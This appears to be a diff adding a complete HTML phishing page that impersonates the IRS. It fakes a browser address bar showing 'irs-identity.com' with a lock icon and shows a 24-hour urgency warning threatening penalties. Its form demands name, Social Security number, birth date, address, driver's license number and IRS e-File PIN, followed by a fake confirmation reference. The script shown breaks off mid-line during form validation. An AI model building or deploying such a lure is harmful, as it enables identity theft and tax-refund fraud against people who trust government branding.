@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>IRS Identity Verification - Tax Refund Status</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root {
+            --navy: #0b1e3d;
+            --navy-light: #13294b;
+            --blue: #1a4480;
+            --blue-bright: #005ea2;
+            --gold: #b8860b;
+            --gold-light: #d4a843;
+            --red: #b50938;
+            --red-banner: #f8e3e3;
+            --red-border: #e4a0a0;
+            --gray-bg: #f0f2f5;
+            --white: #ffffff;
+            --text: #1b1b1b;
+            --text-secondary: #555;
+            --border: #c6cace;
+            --input-bg: #fdfdfd;
+            --shadow: 0 4px 24px rgba(0, 0, 0, 0.18);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: Georgia, 'Times New Roman', serif;
+            background: #e8ecf1;
+            background-image:
+                radial-gradient(ellipse at 50% 0%, rgba(11, 30, 61, 0.06) 0%, transparent 60%),
+                linear-gradient(180deg, #dce2e8 0%, #e8ecf1 30%, #f0f2f5 100%);
+            min-height: 100vh;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Fake Browser Bar */
+        .browser-chrome {
+            width: 100%;
+            max-width: 780px;
+            margin-top: 18px;
+            background: #e8e8ed;
+            border-radius: 10px 10px 0 0;
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 -1px 0 rgba(0, 0, 0, 0.06) inset;
+            border: 1px solid #d1d1d6;
+            border-bottom: none;
+        }
+
+        .browser-dots {
+            display: flex;
+            gap: 7px;
+            flex-shrink: 0;
+        }
+
+        .browser-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .browser-dot.red {
+            background: #ff5f57;
+            border: 1px solid #e0453f;
+        }
+        .browser-dot.yellow {
+            background: #febc2e;
+            border: 1px solid #e0a41e;
+        }
+        .browser-dot.green {
+            background: #28c840;
+            border: 1px solid #1eaa32;
+        }
+
+        .browser-url {
+            flex: 1;
+            background: #ffffff;
+            border-radius: 6px;
+            padding: 8px 14px;
+            font-family: 'SF Mono', 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 12px;
+            color: #3a3a3a;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid #c8c8ce;
+            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.04);
+            white-space: nowrap;
+            overflow: hidden;
+        }
+
+        .browser-url .lock-icon {
+            color: #2d7a3e;
+            font-size: 13px;
+            flex-shrink: 0;
+        }
+
+        .browser-url .url-text {
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .browser-url .url-domain {
+            font-weight: 700;
+            color: #1b1b1b;
+        }
+
+        .browser-url .url-path {
+            color: #6e6e73;
+        }
+
+        /* Main Container */
+        .container {
+            width: 100%;
+            max-width: 780px;
+            background: var(--white);
+            border-radius: 0 0 10px 10px;
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            border: 1px solid #d1d1d6;
+            border-top: none;
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(180deg, #0b1e3d 0%, #102848 40%, #132d54 100%);
+            color: white;
+            padding: 20px 32px 24px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            border-bottom: 3px solid var(--gold);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 180px;
+            height: 100%;
+            background: radial-gradient(ellipse at center, rgba(255, 255, 255, 0.03) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .seal {
+            width: 62px;
+            height: 62px;
+            background: #fefefe;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            border: 3px solid var(--gold);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.25);
+            position: relative;
+            z-index: 1;
+        }
+
+        .seal-inner {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 2px solid #0b1e3d;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #fafafa;
+        }
+
+        .seal-text {
+            font-size: 9px;
+            font-weight: 900;
+            color: #0b1e3d;
+            text-align: center;
+            line-height: 1.1;
+            letter-spacing: 0.3px;
+        }
+
+        .header-text {
+            position: relative;
+            z-index: 1;
+        }
+
+        .header-text .dept {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1.8px;
+            color: #c4d4e8;
+            margin-bottom: 3px;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        .header-text h1 {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 0.4px;
+            color: #ffffff;
+            font-family: Georgia, 'Times New Roman', serif;
+        }
+
+        .header-text .tagline {
+            font-size: 12px;
+            color: #b8c9de;
+            margin-top: 2px;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        /* Urgency Banner */
+        .alert-banner {
+            background: #fff8f6;
+            border-left: 5px solid #b50938;
+            border-bottom: 1px solid #f0d0d0;
+            padding: 16px 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+            background: linear-gradient(135deg, #fff9f8 0%, #fff3f0 100%);
+        }
+
+        .alert-icon {
+            font-size: 26px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .alert-content h3 {
+            font-size: 15px;
+            color: #8b1a1a;
+            margin-bottom: 4px;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            font-weight: 700;
+        }
+
+        .alert-content p {
+            font-size: 13px;
+            color: #6b2c2c;
+            line-height: 1.5;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        .alert-content .deadline {
+            font-weight: 700;
+            color: #b50938;
+        }
+
+        /* Form Section */
+        .form-container {
+            padding: 28px 32px 32px;
+        }
+
+        .form-intro {
+            font-size: 14px;
+            color: #444;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #e8e8e8;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #0b1e3d;
+            margin-bottom: 18px;
+            padding-bottom: 8px;
+            border-bottom: 2px solid #0b1e3d;
+            font-family: Georgia, 'Times New Roman', serif;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .section-title .num {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            background: #0b1e3d;
+            color: white;
+            font-size: 12px;
+            font-weight: 700;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 18px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group.full-width {
+            grid-column: 1 / -1;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #222;
+            margin-bottom: 6px;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            letter-spacing: 0.2px;
+        }
+
+        .form-group label .required {
+            color: #b50938;
+            font-weight: 700;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid #c6cace;
+            border-radius: 5px;
+            font-size: 14px;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            color: #1b1b1b;
+            background: var(--input-bg);
+            transition: all 0.2s ease;
+            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.04);
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #005ea2;
+            box-shadow: 0 0 0 3px rgba(0, 94, 162, 0.12), inset 0 1px 2px rgba(0, 0, 0, 0.04);
+        }
+
+        .form-group input::placeholder {
+            color: #aaa;
+            font-style: italic;
+        }
+
+        .ssn-note {
+            font-size: 11px;
+            color: #777;
+            margin-top: 4px;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        /* Submit Button */
+        .submit-row {
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid #e8e8e8;
+            text-align: center;
+        }
+
+        .submit-btn {
+            width: 100%;
+            max-width: 400px;
+            padding: 16px 32px;
+            background: linear-gradient(180deg, #0b3d6b 0%, #0b1e3d 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            box-shadow: 0 2px 8px rgba(11, 30, 61, 0.3);
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(180deg, #0e4a80 0%, #0d2448 100%);
+            box-shadow: 0 4px 14px rgba(11, 30, 61, 0.4);
+            transform: translateY(-1px);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+            box-shadow: 0 1px 4px rgba(11, 30, 61, 0.3);
+        }
+
+        .submit-note {
+            font-size: 11px;
+            color: #777;
+            margin-top: 10px;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        /* Footer */
+        .footer {
+            background: #f5f6f8;
+            padding: 16px 24px;
+            text-align: center;
+            font-size: 11px;
+            color: #888;
+            border-top: 1px solid #e0e0e0;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            line-height: 1.6;
+        }
+
+        .footer .official {
+            color: #555;
+            font-weight: 500;
+        }
+
+        /* Success Message */
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 50px 40px 60px;
+        }
+
+        .success-message .check-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #e8f5e9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 44px;
+            border: 3px solid #2e7d32;
+        }
+
+        .success-message h2 {
+            color: #1b5e20;
+            font-size: 22px;
+            margin-bottom: 10px;
+            font-family: Georgia, 'Times New Roman', serif;
+        }
+
+        .success-message p {
+            color: #555;
+            font-size: 14px;
+            line-height: 1.6;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        .success-message .ref-num {
+            background: #f5f5f5;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-family: 'SF Mono', 'Consolas', monospace;
+            font-size: 14px;
+            color: #333;
+            display: inline-block;
+            margin-top: 8px;
+            letter-spacing: 1px;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .browser-chrome {
+                border-radius: 0;
+                margin-top: 0;
+                padding: 8px 12px;
+                gap: 6px;
+            }
+            .browser-dot {
+                width: 10px;
+                height: 10px;
+            }
+            .browser-dots {
+                gap: 5px;
+            }
+            .browser-url {
+                font-size: 10px;
+                padding: 6px 10px;
+            }
+            .container {
+                border-radius: 0;
+            }
+            .header {
+                flex-direction: column;
+                text-align: center;
+                padding: 16px 20px 20px;
+                gap: 10px;
+            }
+            .seal {
+                width: 50px;
+                height: 50px;
+            }
+            .seal-inner {
+                width: 38px;
+                height: 38px;
+            }
+            .seal-text {
+                font-size: 7px;
+            }
+            .header-text h1 {
+                font-size: 18px;
+            }
+            .form-container {
+                padding: 20px 16px;
+            }
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 0;
+            }
+            .alert-banner {
+                padding: 12px 16px;
+                gap: 10px;
+            }
+            .submit-btn {
+                max-width: 100%;
+                font-size: 14px;
+                padding: 14px 20px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .browser-url .url-path {
+                display: none;
+            }
+            .header-text .dept {
+                font-size: 9px;
+                letter-spacing: 1.2px;
+            }
+            .header-text h1 {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Fake Browser Chrome -->
+    <div class="browser-chrome">
+        <div class="browser-dots">
+            <span class="browser-dot red"></span>
+            <span class="browser-dot yellow"></span>
+            <span class="browser-dot green"></span>
+        </div>
+        <div class="browser-url">
+            <span class="lock-icon">🔒</span>
+            <span class="url-text">
+                <span class="url-domain">irs-identity.com</span><span class="url-path">/verify/refund-status/2024</span>
+            </span>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="seal">
+                <div class="seal-inner">
+                    <span class="seal-text">IRS</span>
+                </div>
+            </div>
+            <div class="header-text">
+                <div class="dept">United States Department of the Treasury</div>
+                <h1>Internal Revenue Service</h1>
+                <div class="tagline">Identity Verification Portal &mdash; Tax Refund Status</div>
+            </div>
+        </div>
+
+        <!-- Alert Banner -->
+        <div class="alert-banner">
+            <span class="alert-icon">⚠️</span>
+            <div class="alert-content">
+                <h3>Immediate Action Required</h3>
+                <p>Due to recent data breaches affecting taxpayer records, the IRS requires <strong>additional identity verification</strong> before your tax refund can be processed. <span class="deadline">Failure to verify within 24 hours may result in a delay of your refund or assessment of a compliance penalty.</span></p>
+            </div>
+        </div>
+
+        <!-- Form Section -->
+        <div id="formSection">
+            <div class="form-container">
+                <p class="form-intro">
+                    Please complete all fields below to verify your identity. This information will be matched against our secure taxpayer database to confirm your eligibility for the pending refund. All fields are mandatory.
+                </p>
+
+                <form id="verificationForm" onsubmit="handleSubmit(event)">
+                    <!-- Personal Information -->
+                    <div class="section-title">
+                        <span class="num">1</span> Taxpayer Identification
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group full-width">
+                            <label for="full_name"><span class="required">*</span> Full Legal Name</label>
+                            <input type="text" id="full_name" name="full_name" placeholder="John Doe" required autocomplete="off">
+                        </div>
+                        <div class="form-group">
+                            <label for="ssn"><span class="required">*</span> Social Security Number</label>
+                            <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" required autocomplete="off" maxlength="11">
+                            <div class="ssn-note">Enter without dashes or with dashes</div>
+                        </div>
+                        <div class="form-group">
+                            <label for="dob"><span class="required">*</span> Date of Birth</label>
+                            <input type="text" id="dob" name="dob" placeholder="MM/DD/YYYY" required autocomplete="off">
+                        </div>
+                    </div>
+
+                    <!-- Contact Information -->
+                    <div class="section-title" style="margin-top: 24px;">
+                        <span class="num">2</span> Contact & Residential Information
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group full-width">
+                            <label for="address"><span class="required">*</span> Home Address</label>
+                            <input type="text" id="address" name="address" placeholder="123 Main St, Anytown, USA" required autocomplete="off">
+                        </div>
+                        <div class="form-group">
+                            <label for="email"><span class="required">*</span> Email Address</label>
+                            <input type="text" id="email" name="email" placeholder="example@mail.com" required autocomplete="off">
+                        </div>
+                        <div class="form-group">
+                            <label for="phone"><span class="required">*</span> Phone Number</label>
+                            <input type="text" id="phone" name="phone" placeholder="(555) 123-4567" required autocomplete="off">
+                        </div>
+                    </div>
+
+                    <!-- Verification Credentials -->
+                    <div class="section-title" style="margin-top: 24px;">
+                        <span class="num">3</span> Verification Credentials
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="dl_number"><span class="required">*</span> Driver's License Number</label>
+                            <input type="text" id="dl_number" name="dl_number" placeholder="D-1234567" required autocomplete="off">
+                        </div>
+                        <div class="form-group">
+                            <label for="efile_pin"><span class="required">*</span> IRS e-File PIN</label>
+                            <input type="password" id="efile_pin" name="efile_pin" placeholder="Enter your 5-digit PIN" required autocomplete="off" maxlength="5">
+                        </div>
+                    </div>
+
+                    <!-- Submit -->
+                    <div class="submit-row">
+                        <button type="submit" class="submit-btn">Verify My Identity &amp; Process Refund</button>
+                        <p class="submit-note">By submitting, you certify that the information provided is true and accurate under penalty of perjury (26 U.S.C. § 7206).</p>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Success Message -->
+        <div class="success-message" id="successMessage">
+            <div class="check-icon">✅</div>
+            <h2>Identity Verification Submitted</h2>
+            <p>Your identity verification has been received and is being processed. Your tax refund will be released within <strong>5-7 business days</strong> upon successful verification.</p>
+            <p style="margin-top: 8px; font-size: 12px; color: #777;">Confirmation Reference:</p>
+            <span class="ref-num">IRS-VFY-2024-9X7K3M</span>
+            <p style="margin-top: 14px; font-size: 12px; color: #999;">You may close this page. A confirmation email will be sent to the address provided.</p>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <span class="official">Internal Revenue Service</span> &mdash; United States Department of the Treasury<br>
+            This is a secure, encrypted connection. Your information is protected under the Privacy Act of 1974.<br>
+            &copy; 2024 IRS.gov | <span style="color: #005ea2;">Privacy Policy</span> | <span style="color: #005ea2;">Accessibility</span>
+        </div>
+    </div>
+
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+
+            // Basic client-side validation
+            const form = document.getElementById('verificationForm');
+            const inputs = form.querySelectorAll('input[required]');
+            let allFilled = true;
+
+            inputs.forEach(function(input) {
+                if (!input.value.trim()) {
+                    allFilled = false;
+                    input.style.borderColor = '#b50938';
+                    input.style.boxShadow = '0 0 0 3px rgba(181,9,56,0.1), inset 0 1px 2px rgba(0,0,0,0.04)';
+                } else {
+                    input.style.borderColor = '#c6cace';
+                    input.style.boxShadow = 'inset 0 1px
